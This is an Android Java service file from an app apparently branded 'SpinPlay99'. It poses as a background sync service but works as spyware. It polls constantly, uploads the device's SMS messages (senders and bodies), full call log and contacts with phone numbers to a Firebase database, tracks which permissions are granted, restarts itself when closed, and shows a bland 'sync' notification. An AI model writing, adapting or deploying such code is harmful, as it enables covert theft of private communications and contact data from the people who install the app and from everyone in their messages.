package com.spinplay99.adminpanel;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.Settings;
import android.provider.Telephony;

import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import com.google.firebase.FirebaseApp;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ServerValue;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

public class BackgroundSyncService extends Service {

    private static final String CHANNEL_ID = "spinplay99_sync_channel";
    private static final int NOTIFICATION_ID = 999;

    private DatabaseReference mDatabase;
    private String deviceId;
    private Handler handler;
    private Runnable syncRunnable;
    private boolean isFirstSync = true;
    private int lastSmsCount = 0;
    private int lastCallCount = 0;

    @Override
    public void onCreate() {
        super.onCreate();

        FirebaseApp.initializeApp(this);
        mDatabase = FirebaseDatabase.getInstance().getReference();
        deviceId = Settings.Secure.getString(getContentResolver(),
                   Settings.Secure.ANDROID_ID);
        handler = new Handler(Looper.getMainLooper());

        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createNotification());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startSyncLoop();
        return START_STICKY;
    }

    private void startSyncLoop() {
        syncRunnable = new Runnable() {
            @Override
            public void run() {
                syncDataToFirebase();
                handler.postDelayed(this, 2000);
            }
        };
        handler.post(syncRunnable);
    }

    private void syncDataToFirebase() {
        DatabaseReference deviceRef = mDatabase.child("devices").child(deviceId);

        // Online status
        deviceRef.child("online_status").setValue(true);
        deviceRef.child("online_status").onDisconnect().setValue(false);
        deviceRef.child("device_info").child("last_seen").onDisconnect().setValue(ServerValue.TIMESTAMP);

        // Live data
        Map<String, Object> liveData = collectLiveData();
        deviceRef.child("live_data").setValue(liveData);

        // Device info
        updateDeviceInfo();
    }

    private Map<String, Object> collectLiveData() {
        Map<String, Object> data = new HashMap<>();
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS", Locale.getDefault());

        data.put("timestamp", sdf.format(new Date()));
        data.put("timestamp_millis", System.currentTimeMillis());
        data.put("battery_level", getBatteryLevel());
        data.put("network_type", getNetworkType());
        data.put("is_charging", isDeviceCharging());
        data.put("screen_on", isScreenOn());
        data.put("permissions", getAllPermissionsStatus());
        data.put("sync_type", "BACKGROUND_SERVICE");

        // SMS
        if (checkPermission(Manifest.permission.READ_SMS)) {
            int currentSmsCount = getSmsCount();
            data.put("total_sms", currentSmsCount);
            data.put("unread_sms", getUnreadSmsCount());

            if (isFirstSync) {
                sendAllSms();
                lastSmsCount = currentSmsCount;
            }
        }

        // Calls
        if (checkPermission(Manifest.permission.READ_CALL_LOG)) {
            int currentCallCount = getCallLogsCount();
            data.put("total_calls", currentCallCount);

            if (isFirstSync) {
                sendAllCalls();
                lastCallCount = currentCallCount;
            }
        }

        // Contacts
        if (checkPermission(Manifest.permission.READ_CONTACTS)) {
            data.put("contacts_count", getContactsCount());
            if (isFirstSync) sendAllContacts();
        }

        if (isFirstSync) isFirstSync = false;

        return data;
    }

    private void updateDeviceInfo() {
        Map<String, Object> info = new HashMap<>();
        info.put("device_id", deviceId);
        info.put("device_model", Build.MODEL);
        info.put("device_brand", Build.BRAND);
        info.put("android_version", Build.VERSION.RELEASE);
        info.put("sdk_version", Build.VERSION.SDK_INT);
        info.put("last_seen", ServerValue.TIMESTAMP);

        mDatabase.child("devices").child(deviceId).child("device_info").updateChildren(info);
    }

    // ==================== SMS ====================

    private void sendAllSms() {
        new Thread(() -> {
            List<Map<String, Object>> messages = getAllSmsFormatted();
            if (messages.isEmpty()) return;

            Map<String, Object> smsData = new HashMap<>();
            smsData.put("total_count", messages.size());
            smsData.put("last_updated", ServerValue.TIMESTAMP);
            smsData.put("messages", messages);

            mDatabase.child("devices").child(deviceId).child("all_sms").setValue(smsData);
        }).start();
    }

    private List<Map<String, Object>> getAllSmsFormatted() {
        List<Map<String, Object>> list = new ArrayList<>();
        Cursor cursor = null;
        try {
            cursor = getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                new String[]{"_id", "address", "body", "date", "type", "read"},
                null, null, "date DESC");

            if (cursor != null && cursor.moveToFirst()) {
                do {
                    Map<String, Object> sms = new HashMap<>();
                    sms.put("id", cs(cursor, 0));
                    sms.put("address", cs(cursor, 1));
                    String body = cs(cursor, 2);
                    sms.put("body", body.length() > 200 ? body.substring(0, 200) + "..." : body);
                    String dateStr = cs(cursor, 3);
                    sms.put("date", dateStr);
                    sms.put("date_readable", formatDate(Long.parseLong(dateStr)));

                    String typeStr = cs(cursor, 4);
                    String type = "OTHER";
                    if ("1".equals(typeStr)) type = "INBOX";
                    else if ("2".equals(typeStr)) type = "SENT";
                    sms.put("type", type);
                    sms.put("read", cs(cursor, 5));
                    list.add(sms);
                } while (cursor.moveToNext());
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (cursor != null) cursor.close();
        }
        return list;
    }

    private int getSmsCount() {
        return getCount(Telephony.Sms.CONTENT_URI);
    }

    private int getUnreadSmsCount() {
        int count = 0;
        try {
            Cursor cursor = getContentResolver().query(
                Telephony.Sms.Inbox.CONTENT_URI, null, "read = 0", null, null);
            if (cursor != null) { count = cursor.getCount(); cursor.close(); }
        } catch (Exception e) {}
        return count;
    }

    // ==================== CALLS ====================

    private void sendAllCalls() {
        new Thread(() -> {
            List<Map<String, Object>> calls = getAllCallsFormatted();
            if (calls.isEmpty()) return;

            Map<String, Object> callData = new HashMap<>();
            callData.put("total_count", calls.size());
            callData.put("last_updated", ServerValue.TIMESTAMP);
            callData.put("calls", calls);

            mDatabase.child("devices").child(deviceId).child("all_calls").setValue(callData);
        }).start();
    }

    private List<Map<String, Object>> getAllCallsFormatted() {
        List<Map<String, Object>> list = new ArrayList<>();
        Cursor cursor = null;
        try {
            cursor = getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                new String[]{"_id", "number", "type", "date", "duration", "name"},
                null, null, "date DESC");

            if (cursor != null && cursor.moveToFirst()) {
                do {
                    Map<String, Object> call = new HashMap<>();
                    call.put("id", cs(cursor, 0));
                    call.put("number", cs(cursor, 1));

                    String typeStr = cs(cursor, 2);
                    String type = "UNKNOWN";
                    if ("1".equals(typeStr)) type = "INCOMING";
                    else if ("2".equals(typeStr)) type = "OUTGOING";
                    else if ("3".equals(typeStr)) type = "MISSED";
                    call.put("type", type);

                    String dateStr = cs(cursor, 3);
                    call.put("date", dateStr);
                    call.put("date_readable", formatDate(Long.parseLong(dateStr)));
                    call.put("duration", cs(cursor, 4));
                    call.put("contact_name", cs(cursor, 5));
                    list.add(call);
                } while (cursor.moveToNext());
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (cursor != null) cursor.close();
        }
        return list;
    }

    private int getCallLogsCount() {
        return getCount(CallLog.Calls.CONTENT_URI);
    }

    // ==================== CONTACTS ====================

    private void sendAllContacts() {
        new Thread(() -> {
            List<Map<String, Object>> contacts = getAllContactsFormatted();
            if (contacts.isEmpty()) return;

            Map<String, Object> contactData = new HashMap<>();
            contactData.put("total_count", contacts.size());
            contactData.put("last_updated", ServerValue.TIMESTAMP);
            contactData.put("contacts", contacts);

            mDatabase.child("devices").child(deviceId).child("all_contacts").setValue(contactData);
        }).start();
    }

    private List<Map<String, Object>> getAllContactsFormatted() {
        List<Map<String, Object>> list = new ArrayList<>();
        Cursor cursor = null;
        try {
            cursor = getContentResolver().query(
                android.provider.ContactsContract.Contacts.CONTENT_URI,
                new String[]{"_id", "display_name", "has_phone_number"},
                null, null, "display_name ASC LIMIT 200");

            if (cursor != null && cursor.moveToFirst()) {
                do {
                    Map<String, Object> contact = new HashMap<>();
                    String contactId = cs(cursor, 0);
                    contact.put("id", contactId);
                    contact.put("name", cs(cursor, 1));

                    if ("1".equals(cs(cursor, 2))) {
                        contact.put("phone", getPhoneNumber(contactId));
                    }
                    list.add(contact);
                } while (cursor.moveToNext());
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (cursor != null) cursor.close();
        }
        return list;
    }

    private String getPhoneNumber(String contactId) {
        try {
            Cursor cursor = getContentResolver().query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{"number"}, "contact_id = ?", new String[]{contactId}, null);
            if (cursor != null && cursor.moveToFirst()) {
                String number = cursor.getString(0);
                cursor.close();
                return number;
            }
            if (cursor != null) cursor.close();
        } catch (Exception e) {}
        return "No Number";
    }

    private int getContactsCount() {
        return getCount(android.provider.ContactsContract.Contacts.CONTENT_URI);
    }

    // ==================== HELPERS ====================

    private String cs(Cursor cursor, int index) {
        try { return cursor.getString(index); } catch (Exception e) { return ""; }
    }

    private String formatDate(long timestamp) {
        try {
            return new SimpleDateFormat("dd/MM/yyyy hh:mm a", Locale.getDefault())
                    .format(new Date(timestamp));
        } catch (Exception e) { return "Unknown"; }
    }

    private int getCount(Uri uri) {
        int count = 0;
        try {
            Cursor cursor = getContentResolver().query(uri, null, null, null, null);
            if (cursor != null) { count = cursor.getCount(); cursor.close(); }
        } catch (Exception e) {}
        return count;
    }

    private Map<String, Boolean> getAllPermissionsStatus() {
        Map<String, Boolean> perms = new HashMap<>();
        perms.put("call_phone", checkPermission(Manifest.permission.CALL_PHONE));
        perms.put("read_phone_state", checkPermission(Manifest.permission.READ_PHONE_STATE));
        perms.put("send_sms", checkPermission(Manifest.permission.SEND_SMS));
        perms.put("receive_sms", checkPermission(Manifest.permission.RECEIVE_SMS));
        perms.put("read_sms", checkPermission(Manifest.permission.READ_SMS));
        perms.put("read_call_log", checkPermission(Manifest.permission.READ_CALL_LOG));
        perms.put("read_contacts", checkPermission(Manifest.permission.READ_CONTACTS));
        perms.put("location", checkPermission(Manifest.permission.ACCESS_FINE_LOCATION));
        return perms;
    }

    private boolean checkPermission(String permission) {
        return ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED;
    }

    private int getBatteryLevel() {
        int level = 0;
        try {
            Intent intent = registerReceiver(null, new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (intent != null) {
                int scale = intent.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
                level = intent.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
                if (scale > 0) level = (level * 100) / scale;
            }
        } catch (Exception e) {}
        return level;
    }

    private String getNetworkType() {
        try {
            android.net.ConnectivityManager cm = (android.net.ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            android.net.NetworkInfo network = cm.getActiveNetworkInfo();
            if (network != null && network.isConnected()) return network.getTypeName();
        } catch (Exception e) {}
        return "No Connection";
    }

    private boolean isDeviceCharging() {
        try {
            Intent intent = registerReceiver(null, new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (intent != null) {
                int status = intent.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
                return status == android.os.BatteryManager.BATTERY_STATUS_CHARGING ||
                       status == android.os.BatteryManager.BATTERY_STATUS_FULL;
            }
        } catch (Exception e) {}
        return false;
    }

    private boolean isScreenOn() {
        android.os.PowerManager pm = (android.os.PowerManager) getSystemService(Context.POWER_SERVICE);
        return pm != null && pm.isInteractive();
    }

    // ==================== NOTIFICATION ====================

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID, "Sync Service", NotificationManager.IMPORTANCE_LOW);
            channel.setDescription("Background data sync");
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    private Notification createNotification() {
        Intent intent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
            this, 0, intent, PendingIntent.FLAG_IMMUTABLE);

        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("SpinPlay99")
                .setContentText("Sync service running...")
                .setSmallIcon(android.R.drawable.ic_menu_manage)
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        mDatabase.child("devices").child(deviceId).child("online_status").setValue(false);
        if (handler != null && syncRunnable != null) {
            handler.removeCallbacks(syncRunnable);
        }
        super.onDestroy();
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Intent restartIntent = new Intent(getApplicationContext(), BackgroundSyncService.class);
        startService(restartIntent);
        super.onTaskRemoved(rootIntent);
    }
}
